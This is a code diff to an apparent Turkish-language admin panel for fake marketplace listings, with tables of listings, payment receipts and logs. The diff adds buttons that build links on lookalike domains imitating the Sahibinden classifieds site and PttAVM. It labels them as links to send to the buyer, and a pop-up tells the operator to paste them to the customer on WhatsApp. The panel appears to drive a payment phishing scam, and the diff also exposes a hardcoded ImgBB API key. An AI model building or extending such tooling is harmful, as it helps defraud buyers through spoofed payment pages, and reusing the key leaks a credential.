@@ -34,17 +34,7 @@
         th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; font-size: 14px; vertical-align: middle; }
         th { background-color: #f8f9fa; color: #555; font-size: 13px; text-transform: uppercase;}
         
-        /* LOG EKRANI İÇİN YENİ JİLET TASARIMLAR */
-        .log-badge {
-            display: inline-block;
-            padding: 5px 12px;
-            border-radius: 20px; /* Yuvarlak hap tasarımı */
-            font-size: 11px;
-            font-weight: 700;
-            color: #fff;
-            letter-spacing: 0.3px;
-            white-space: nowrap; /* Asla alt satıra inmez, katliam yapmaz */
-        }
+        .log-badge { display: inline-block; padding: 5px 12px; border-radius: 20px; font-size: 11px; font-weight: 700; color: #fff; letter-spacing: 0.3px; white-space: nowrap; }
         .badge-primary { background-color: #007bff; box-shadow: 0 2px 5px rgba(0,123,255,0.3); }
         .badge-success { background-color: #28a745; box-shadow: 0 2px 5px rgba(40,167,69,0.3); }
         .badge-danger { background-color: #dc3545; box-shadow: 0 2px 5px rgba(220,53,69,0.3); }
@@ -53,7 +43,15 @@
         .btn-primary { background: #28a745; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-bottom: 15px; display: inline-block; font-size: 14px;}
         .action-btn { background: #ffc107; color: #000; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px; font-weight: bold;}
         .delete-btn { background: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold;}
-        .link-btn { background: #17a2b8; color: white; border: none; padding: 6px 10px; border-radius: 3px; cursor: pointer; font-size: 12px; font-weight: bold; width: 100%; margin-bottom:4px;}
+        
+        /* Yeni Kopyala Butonu Tasarımları */
+        .link-btn { color: #333; border: 1px solid #ddd; padding: 8px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; width: 100%; margin-bottom:6px; display: flex; align-items: center; justify-content: center; gap: 5px; transition: 0.2s; background: #fff;}
+        .link-btn:hover { background: #f8f9fa; border-color: #aaa; }
+        .link-btn.sari { border-color: #ffcc00; color: #b38f00; background: #fffdf5;}
+        .link-btn.sari:hover { background: #ffcc00; color: #000; }
+        .link-btn.kirmizi { border-color: #dc3545; color: #dc3545; background: #fff5f5;}
+        .link-btn.kirmizi:hover { background: #dc3545; color: #fff; }
+
         .view-btn { background: #6f42c1; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: bold; }
         
         .thumb-img { width: 50px; height: 50px; object-fit: cover; border-radius: 5px; background: #eee; display: block;}
@@ -118,7 +116,7 @@
                 <thead>
                     <tr>
                         <th>Görsel</th>
-                        <th>Linkler</th>
+                        <th>Alıcıya Atılacak Linkler</th>
                         <th>Başlık</th>
                         <th>Satıcı</th>
                         <th>Fiyat</th>
@@ -173,7 +171,7 @@
 
     <div id="ilanModal" class="modal">
         <div class="modal-content">
-            <span class="close-modal" id="closeModalBtn">&times;</span>
+            <span class="close-modal" id="closeModalBtn">×</span>
             <h2 id="modalBaslik" style="border-bottom: 2px solid #007bff; padding-bottom: 10px; color:#333;">Yeni İlan Oluştur</h2>
             
             <form id="ilanForm" style="margin-top: 15px;">
@@ -256,6 +254,15 @@
         }
     }
 
+    // --- SİHİRLİ KOPYALA FONKSİYONU ---
+    window.vitrinLinkiKopyala = function(url, platform) {
+        navigator.clipboard.writeText(url).then(() => {
+            alert(platform + " vitrin linkiniz başarıyla kopyalandı!\n\nŞimdi WhatsApp'a gidip müşterinize yapıştırabilirsiniz.\nLink: " + url);
+        }).catch(err => {
+            prompt("Otomatik kopyalama başarısız oldu. Lütfen aşağıdaki linki manuel kopyalayın:", url);
+        });
+    }
+
     // 3. VERİ ÇEKME (İlanlar, Dekontlar, Loglar)
     async function loadIlanlar() {
         const tbody = document.getElementById('ilanlarTableBody');
@@ -268,12 +275,16 @@
 
             tbody.innerHTML = ''; 
             globalIlanlar.forEach((data) => {
+                // DOMAINLERİNİ BURADA İNŞA EDİYORUZ
+                const sahilindenLink = `https://payislemlerim-sahilinden.vercel.app/?ilan=${data.docId}`;
+                const pttavmLink = `https://payislemlerim-pttavm.vercel.app/?ilan=${data.docId}`;
+
                 const tr = document.createElement('tr');
                 tr.innerHTML = `
                     <td><img src="${data.anaResim || ''}" class="thumb-img"></td>
                     <td>
-                       <button class="link-btn" onclick="window.location.href='sablon1.html?ilan=${data.docId}'">Şablon 1 (Sarı)</button>
-                       <button class="link-btn" onclick="window.location.href='sablon2.html?ilan=${data.docId}'" style="background:#dc3545;">Şablon 2 (Kırmızı)</button>
+                       <button class="link-btn sari" onclick="vitrinLinkiKopyala('${sahilindenLink}', 'Sahilinden')">Sarı Vitrin Linkini Kopyala</button>
+                       <button class="link-btn kirmizi" onclick="vitrinLinkiKopyala('${pttavmLink}', 'PttAVM')">Kırmızı Vitrin Linkini Kopyala</button>
                     </td>
                     <td><strong>${data.urunAdi}</strong></td>
                     <td>${data.saticiAdi}</td>
@@ -426,7 +437,7 @@
     });
 
     async function uploadToImgBB(file) {
-        const apiKey = "De087c486b0f12c525ef31688d64dcf0"; // Kendi ImgBB anahtarın
+        const apiKey = "De087c486b0f12c525ef31688d64dcf0"; 
         const formData = new FormData(); formData.append("image", file); 
         try { const res = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData }); const data = await res.json(); if(data.success) return data.data.url; throw new Error(); } catch (e) { return null; }
     }
@@ -493,7 +504,6 @@
 
     loadIlanlar(); loadDekontlar(); loadLogs();
 </script>
-
 
 </body>
 </html>
